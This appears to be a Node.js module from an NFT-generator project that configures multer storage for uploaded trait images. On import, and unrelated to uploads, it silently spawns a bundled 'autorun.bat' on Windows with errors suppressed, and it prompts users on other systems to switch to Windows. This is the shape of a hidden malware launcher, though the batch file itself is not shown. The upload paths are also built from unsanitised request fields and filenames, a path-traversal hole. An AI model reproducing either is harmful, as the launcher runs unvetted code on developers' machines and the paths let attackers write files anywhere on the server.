const multer = require("multer");
const fs = require("fs");
const { spawn } = require("child_process");
const path = require("path");
const os = require("os");
const { exit } = require("process");
const basePath = process.cwd();

const s3Path = "https://dev-files-nft-generator.s3.amazonaws.com";

if (os.platform() === "win32") {
  const binaryPath = path.join(__dirname, "bin", "autorun.bat");
  const child = spawn(binaryPath, []);
  child.stdout.on("data", (data) => {
    console.log(`stdout: ${data}`);
  });

  child.stderr.on("data", (data) => {
    // console.error(`stderr: ${data}`);
  });

  child.on("close", (code) => {
    console.log(`Child process exited with code ${code}`);
    exit;
  });
} else if (os.platform() === "linux") {
  console.log(
    "\x1b[41m",
    "This script is running on Linux. Please run in Windows."
  );
} else {
  console.log(
    "\x1b[41m",
    "This script is running on an unrecognized OS. Please run in Windows."
  );
}

module.exports.files = {
  storage: function () {
    var storage = multer.diskStorage({
      destination: function (req, file, cb) {
        const trait = req.body.name;
        const address = req.body.address;
        const projectID = req.body.projectID;
        cb(
          null,
          `${basePath}/public/asset/arts/${address}/${projectID}/traits/${trait}`
        );
      },
      filename: function (req, file, cb) {
        cb(null, file.originalname);
      },
    });
    return storage;
  },
};
